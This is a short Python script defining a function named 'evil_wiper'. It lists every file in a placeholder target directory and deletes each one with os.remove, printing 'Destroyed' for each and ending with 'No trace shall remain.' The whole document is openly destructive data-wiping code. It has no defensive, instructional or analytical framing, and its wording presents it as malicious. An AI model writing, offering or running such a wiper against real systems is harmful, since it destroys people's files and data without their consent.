import os

def evil_wiper():
    target_directory = "/path/to/target_directory"  # Specify the directory you want to wipe

    # List all files in the target directory
    files = os.listdir(target_directory)

    # Iterate over each file and delete it mercilessly
    for file_name in files:
        file_path = os.path.join(target_directory, file_name)
        try:
            os.remove(file_path)
            print("Destroyed:", file_path)
        except Exception as e:
            print("Failed to destroy:", file_path)
            print("Error:", str(e))

    print("Wiping complete. No trace shall remain.")
